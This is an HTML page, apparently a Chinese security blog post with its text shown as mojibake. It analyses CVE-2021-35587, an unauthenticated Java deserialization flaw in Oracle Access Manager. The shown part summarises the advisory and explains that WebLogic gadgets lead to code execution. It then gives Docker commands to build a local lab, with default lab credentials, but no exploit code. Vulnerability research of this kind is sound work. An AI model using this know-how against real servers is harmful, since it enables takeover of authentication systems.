aria-label=ä¸ºä½•æœ‰æ—¶æŒ‚ä¸Šè°ƒè¯•ååº”ç”¨å¡æ­»ï¼Ÿ>ä¸ºä½•æœ‰æ—¶æŒ‚ä¸Šè°ƒè¯•ååº”ç”¨å¡æ­»ï¼Ÿ</a></li><li><a href=#%e8%b0%83%e8%af%95%e6%97%b6%e6%97%a0%e6%b3%95%e8%bf%9b%e5%85%a5java%e5%8c%85%e4%b8%ad%e7%9a%84%e4%bb%a3%e7%a0%81 aria-label=è°ƒè¯•æ—¶æ— æ³•è¿›å…¥java.*åŒ…ä¸­çš„ä»£ç ï¼Ÿ>è°ƒè¯•æ—¶æ— æ³•è¿›å…¥java.*åŒ…ä¸­çš„ä»£ç ï¼Ÿ</a></li><li><a href=#arthas%e9%99%84%e5%88%b0java%e8%bf%9b%e7%a8%8b%e5%90%8eidea%e8%b0%83%e8%af%95%e5%87%ba%e9%97%ae%e9%a2%98 aria-label=arthasé™„åˆ°Javaè¿›ç¨‹åideaè°ƒè¯•å‡ºé—®é¢˜>arthasé™„åˆ°Javaè¿›ç¨‹åideaè°ƒè¯•å‡ºé—®é¢˜</a></li><li><a href=#%e4%b8%8b%e6%96%ad%e7%82%b9%e6%98%be%e7%a4%ba%e7%81%b0%e8%89%b2%e6%80%8e%e4%b9%88%e5%8a%9e aria-label=ä¸‹æ–­ç‚¹æ˜¾ç¤ºç°è‰²æ€ä¹ˆåŠï¼Ÿ>ä¸‹æ–­ç‚¹æ˜¾ç¤ºç°è‰²æ€ä¹ˆåŠï¼Ÿ</a></li><li><a href=#%e5%85%b3%e9%97%adsmart-step-into aria-label="å…³é—­smart step into">å…³é—­smart step into</a></li><li><a href=#%e6%af%94%e8%be%83%e5%ad%97%e8%8a%82%e6%b5%81 aria-label=æ¯”è¾ƒå­—èŠ‚æµ>æ¯”è¾ƒå­—èŠ‚æµ</a></li><li><a href=#%e8%83%bd%e4%bb%8ejvm%e5%8d%b8%e8%bd%bd%e4%b8%80%e4%b8%aa%e7%b1%bb%e5%8a%a0%e8%bd%bd%e4%b8%80%e4%b8%aa%e7%b1%bb%e7%9a%84%e6%96%b0%e7%89%88%e6%9c%ac%e5%90%97 aria-label=èƒ½ä»jvmå¸è½½ä¸€ä¸ªç±»/åŠ è½½ä¸€ä¸ªç±»çš„æ–°ç‰ˆæœ¬å—ï¼Ÿ>èƒ½ä»jvmå¸è½½ä¸€ä¸ªç±»/åŠ è½½ä¸€ä¸ªç±»çš„æ–°ç‰ˆæœ¬å—ï¼Ÿ</a></li><li><a href=#%e5%a6%82%e4%bd%95%e7%9f%a5%e9%81%93%e6%81%b6%e6%84%8f%e4%bb%a3%e7%a0%81%e6%98%af%e5%90%a6%e8%a2%ab%e6%89%a7%e8%a1%8c%e4%ba%86 aria-label=å¦‚ä½•çŸ¥é“æ¶æ„ä»£ç æ˜¯å¦è¢«æ‰§è¡Œäº†ï¼Ÿ>å¦‚ä½•çŸ¥é“æ¶æ„ä»£ç æ˜¯å¦è¢«æ‰§è¡Œäº†ï¼Ÿ</a></li><li><a href=#%e5%a6%82%e4%bd%95%e4%bf%9d%e6%8c%81%e8%89%af%e5%a5%bd%e7%9a%84%e5%bf%83%e6%80%81 aria-label=å¦‚ä½•ä¿æŒè‰¯å¥½çš„å¿ƒæ€ï¼Ÿ>å¦‚ä½•ä¿æŒè‰¯å¥½çš„å¿ƒæ€ï¼Ÿ</a></li><li><a href=#%e9%81%97%e7%95%99%e9%97%ae%e9%a2%98%e5%a6%82%e4%bd%95%e8%b7%9f%e8%b8%aanative%e8%b0%83%e7%94%a8%e7%9a%84%e8%bf%9b%e5%87%ba aria-label=é—ç•™é—®é¢˜ï¼šå¦‚ä½•è·Ÿè¸ªnativeè°ƒç”¨çš„è¿›å‡ºï¼Ÿ>é—ç•™é—®é¢˜ï¼šå¦‚ä½•è·Ÿè¸ªnativeè°ƒç”¨çš„è¿›å‡ºï¼Ÿ</a></li></ul></li><li><a href=#%e6%89%a9%e5%b1%95%e9%98%85%e8%af%bb aria-label=æ‰©å±•é˜…è¯»>æ‰©å±•é˜…è¯»</a></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h1 id=æ¼æ´æ¦‚å†µ>æ¼æ´æ¦‚å†µ<a hidden class=anchor aria-hidden=true href=#æ¼æ´æ¦‚å†µ>#</a></h1><p><strong>CVEå…¬å‘Š</strong></p><blockquote><p>Vulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: OpenSSO Agent). Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. Successful attacks of this vulnerability can result in takeover of Oracle Access Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).</p><p>â€”â€” <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587</a></p></blockquote><p><strong>OAMæ˜¯ä»€ä¹ˆ</strong></p><p>Oracle Access Manager (OAM) æä¾›èº«ä»½ç®¡ç†ï¼ˆä½¿ç”¨ç”¨æˆ·ã€ç»„å’Œæœºæ„ç®¡ç†ã€è‡ªåŠ©æœåŠ¡ã€æµç¨‹ç®¡ç†åŠŸèƒ½å’Œå§”æ‰˜ç®¡ç†ï¼‰ã€éªŒè¯å’ŒæˆæƒæœåŠ¡ï¼Œä»¥åŠåˆè§„æ€§æŠ¥å‘Šã€‚</p><p>å¯ä»¥ç†è§£ä¸ºOracleç”Ÿæ€ä¸­ä¸€å¥—å•ç‚¹ç™»é™†ç³»ç»Ÿã€‚</p><p><strong>CVE-2021-35587èƒ½è¾¾æˆä»€ä¹ˆæ•ˆæœ</strong></p><p>åˆ©ç”¨è¯¥æ¼æ´ï¼Œä»»æ„èƒ½å¤Ÿè®¿é—®OAMçš„æ”»å‡»è€…ï¼Œæ— éœ€è®¤è¯å³å¯æ”»å OAMServerã€‚</p><p><strong>CVE-2021-35587çš„å½±å“ç‰ˆæœ¬æœ‰å“ªäº›</strong></p><blockquote><p>11.1.2.3.0, 12.2.1.3.0, 12.2.1.4.0</p><p>â€”â€”https://www.oracle.com/security-alerts/cpujan2022.html#AppendixFMW</p></blockquote><p><strong>åŸºæœ¬åŸç†</strong></p><p>è¿™æ˜¯ä¸€ä¸ªJavaåŸç”Ÿååºåˆ—åŒ–æ¼æ´ï¼Œæ¥å—å’Œå¤„ç†ååºåˆ—åŒ–æ•°æ®çš„æ¥å£æ˜¯æ— è®¤è¯çš„ã€‚</p><p>å› ä¸ºOAMåŒ…å«weblogicï¼Œæ‰€ä»¥ååºåˆ—åŒ–è¿‡ç¨‹å¯ä»¥å€ŸåŠ©weblogicçš„gadgetè¾¾æˆä»»æ„Javaä»£ç æ‰§è¡Œï¼Œè¿›è€Œæ‰§è¡Œä»»æ„å‘½ä»¤ä»¥æ”»å æœåŠ¡å™¨ï¼Œgetshellå’Œæ¨ªå‘ç§»åŠ¨ã€‚</p><h1 id=æœ¬åœ°æ­å»ºoam>æœ¬åœ°æ­å»ºOAM<a hidden class=anchor aria-hidden=true href=#æœ¬åœ°æ­å»ºoam>#</a></h1><p>å› ä¸ºè¿™æ˜¯ä¸€å¥—ç›¸å¯¹å¤æ‚çš„ç¯å¢ƒï¼Œæ‰€ä»¥æ­å»ºå¯ç”¨çš„OAMè°ƒè¯•åˆ†æç¯å¢ƒåœ¨åˆ©ç”¨CVE-2021-35587è¿™ä¸ªæ¼æ´çš„è¿‡ç¨‹ä¸­å æ®äº†ç›¸å½“å¤§ä¸€éƒ¨åˆ†æ—¶é—´ã€‚åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œæ¼æ´åŸä½œè€…å’Œæˆ‘æœ‰åŒæ ·çš„ä½“ä¼šã€‚ä¸ºäº†èŠ‚çœåæ¥çš„åˆ†æè€…ï¼Œä»¥åŠä»¥åçš„è‡ªå·±çš„å®è´µçš„æ—¶é—´ï¼Œæˆ‘æŠŠOAMç¯å¢ƒæ­å»ºæ–¹æ³•å’Œæ­å»ºè¿‡ç¨‹ä¸­è¸©åˆ°çš„å„ç§å„æ ·çš„å‘æ€»ç»“åœ¨æ­¤ã€‚</p><h2 id=å¤§çº²>å¤§çº²<a hidden class=anchor aria-hidden=true href=#å¤§çº²>#</a></h2><p>å‚è€ƒ <a href=https://docs.oracle.com/en/middleware/idm/access-manager/12.2.1.4/tutorial-oam-docker/#Background>https://docs.oracle.com/en/middleware/idm/access-manager/12.2.1.4/tutorial-oam-docker/#Background</a> ä½¿ç”¨æ–¹æ³•2è·å–OAMé•œåƒ</p><blockquote><ol><li>Download a prebuilt OAM image from <a href=https://container-registry.oracle.com/>Oracle Container Registry</a> by by navigating to <strong>Middleware</strong> > <strong>oam</strong>. This image contains no patches and should only be used in Developer or Test environments.</li></ol></blockquote><p>ä¸‹è½½åˆ°çš„OAMé•œåƒç”¨äºè·‘èµ·æ¥ä¸‰ä¸ªOAMå®¹å™¨</p><blockquote><ul><li>WebLogic Administration Server (<code>AdminServer</code>)</li><li>OAM Managed Server (<code>oam_server1</code>)</li><li>OAM Policy Manager Managed Server (<code>oam_policy_mgr1</code>)</li></ul></blockquote><p>è·‘èµ·æ¥è¿™ä¸‰ä¸ªå®¹å™¨ä¾èµ–ä¸€ä¸ªå¯ç”¨çš„Oracleæ•°æ®åº“</p><h2 id=æ­¥éª¤æ±‡æ€»>æ­¥éª¤æ±‡æ€»<a hidden class=anchor aria-hidden=true href=#æ­¥éª¤æ±‡æ€»>#</a></h2><ol><li><p>åˆ›å»ºä¸€å°å…¨æ–°çš„Ubuntu18.04ï¼Œåˆ‡æ¢åˆ°rootç”¨æˆ·ã€‚</p></li><li><p>åœ¨ <a href=https://hub.docker.com/_/oracle-database-enterprise-edition>https://hub.docker.com/_/oracle-database-enterprise-edition</a> å’Œ <a href=https://container-registry.oracle.com/>https://container-registry.oracle.com/</a> ç™»å½•è´¦å·ååŒæ„åè®®ã€‚ï¼ˆå‚è€ƒæ­¥éª¤äºŒï¼‰</p></li><li><p>å®‰è£…docker</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-0-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-0-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># apt update</span>
</span></span><span style=display:flex><span><span style=color:#75715e># apt install docker.io</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>docker ç™»å½•dockerhub å’Œ container-registry.oracle.com</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-1-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-1-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># ocker login</span>
</span></span><span style=display:flex><span>	è¾“å…¥ login.docker.com çš„è´¦å·å¯†ç 	
</span></span><span style=display:flex><span><span style=color:#75715e># docker login container-registry.oracle.com</span>
</span></span><span style=display:flex><span>	è¾“å…¥ login.oracle.com çš„è´¦å·å¯†ç 
</span></span></code></pre></td></tr></table></div></div></li><li><p>æ‹‰å–ä¸¤ä¸ªé•œåƒ</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-2-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-2-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># docker pull store/oracle/database-enterprise:12.2.0.1</span>
</span></span><span style=display:flex><span><span style=color:#75715e># docker pull container-registry.oracle.com/middleware/oam:12.2.1.4.0</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>ä¸€äº›å‡†å¤‡å·¥ä½œ</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-3-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-3-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># docker network create -d bridge OamNET</span>
</span></span><span style=display:flex><span><span style=color:#75715e># mkdir -p /scratch/user_projects</span>
</span></span><span style=display:flex><span><span style=color:#75715e># chmod 777 /scratch/user_projects</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>å¯åŠ¨å››ä¸ªå®¹å™¨ï¼ˆ<strong>æ³¨æ„ï¼šå°†ä»¥ä¸‹å‘½ä»¤ä¸­çš„<code>172.17.0.1</code>æ›¿æ¢ä¸ºdockerè™šæ‹Ÿç½‘å¡ç½‘å…³çš„IP</strong>ï¼‰</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-4-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-4-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker run -d -it --name myOracleDB -p 1521:1521 store/oracle/database-enterprise:12.2.0.1
</span></span><span style=display:flex><span>docker run -d --network<span style=color:#f92672>=</span>OamNET -p 7001:7001 --name<span style=color:#f92672>=</span>oamadmin --env CONNECTION_STRING<span style=color:#f92672>=</span>172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env RCUPREFIX<span style=color:#f92672>=</span>OAM1 --env DB_USER<span style=color:#f92672>=</span>sys --env DB_PASSWORD<span style=color:#f92672>=</span>Oradoc_db1 --env DB_SCHEMA_PASSWORD<span style=color:#f92672>=</span>Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0
</span></span><span style=display:flex><span>docker run -d -p 14100:14100 --network<span style=color:#f92672>=</span>OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env MANAGEDSERVER_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>14100</span> --env MANAGED_SERVER_CONTAINER<span style=color:#f92672>=</span>true --env MS_NAME<span style=color:#f92672>=</span>oam_server1 --env MS_HOST<span style=color:#f92672>=</span>oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 <span style=color:#e6db74>&#34;/u01/oracle/dockertools/startMS.sh&#34;</span>
</span></span><span style=display:flex><span>docker run -d -p 15100:15100 --network<span style=color:#f92672>=</span>OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env MANAGEDSERVER_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>15100</span> --env MANAGED_SERVER_CONTAINER<span style=color:#f92672>=</span>true --env MS_NAME<span style=color:#f92672>=</span>oam_policy_mgr1 --env MS_HOST<span style=color:#f92672>=</span>oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 <span style=color:#e6db74>&#34;/u01/oracle/dockertools/startMS.sh&#34;</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>æŸ¥çœ‹å„æœåŠ¡çš„IPåœ°å€</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker inspect -f <span style=color:#e6db74>&#39;{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}&#39;</span> oamadmin oamms oampolicy myOracleDB
</span></span></code></pre></td></tr></table></div></div></li><li><p>ä½¿ç”¨ä»¥ä¸‹é“¾æ¥è®¿é—®æœåŠ¡ã€‚ï¼ˆ<strong>æ³¨æ„ï¼šå°†192.168.0.105æ›¿æ¢ä¸ºè™šæ‹ŸæœºIP</strong>ï¼‰</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-7>7</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>è´¦å·ï¼šweblogic  å¯†ç ï¼šW3bl@gic
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>WebLogic Administration Console   http://192.168.0.105:7001/console         
</span></span><span style=display:flex><span>Oracle Enterprise Manager Console http://192.168.0.105:7001/em       
</span></span><span style=display:flex><span>Oracle Access Management Console  http://192.168.0.105:7001/oamconsole
</span></span><span style=display:flex><span>OAM Server Logout                 http://192.168.0.105:14100/oam/server/logout
</span></span><span style=display:flex><span>Policy Manager Access             http://192.168.0.105:15100/access
</span></span></code></pre></td></tr></table></div></div></li></ol><h2 id=è¿è¡Œoracleæ•°æ®åº“>â‘ è¿è¡ŒOracleæ•°æ®åº“<a hidden class=anchor aria-hidden=true href=#è¿è¡Œoracleæ•°æ®åº“>#</a></h2><h3 id=åˆ›å»ºoracleæ•°æ®åº“>åˆ›å»ºOracleæ•°æ®åº“<a hidden class=anchor aria-hidden=true href=#åˆ›å»ºoracleæ•°æ®åº“>#</a></h3><p>å‚è€ƒ <a href=https://hub.docker.com/_/oracle-database-enterprise-edition>https://hub.docker.com/_/oracle-database-enterprise-edition</a> ç™»é™†è´¦å·åè·³è½¬åˆ° <a href=https://hub.docker.com/u/findneo/content/sub-3762ef81-7448-4275-909b-df7e6b5d4070>https://hub.docker.com/u/findneo/content/sub-3762ef81-7448-4275-909b-df7e6b5d4070</a> ï¼ŒåŒæ„åè®®ã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-8>8</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># sudo docker login </span>
</span></span><span style=display:flex><span>è¾“å…¥docker hubçš„è´¦å·å¯†ç 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># sudo docker pull store/oracle/database-enterprise:12.2.0.1</span>
</span></span><span style=display:flex><span>æ‹‰å–é•œåƒ
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># sudo docker run -d -it --name myOracleDB -p 1521:1521 store/oracle/database-enterprise:12.2.0.1</span>
</span></span><span style=display:flex><span>è¿è¡Œèµ·æ¥ä¸€ä¸ªOracleæ•°æ®åº“ï¼Œå¹¶ä¸”å¼€æ”¾åˆ°æœ¬åœ°çš„1521ç«¯å£
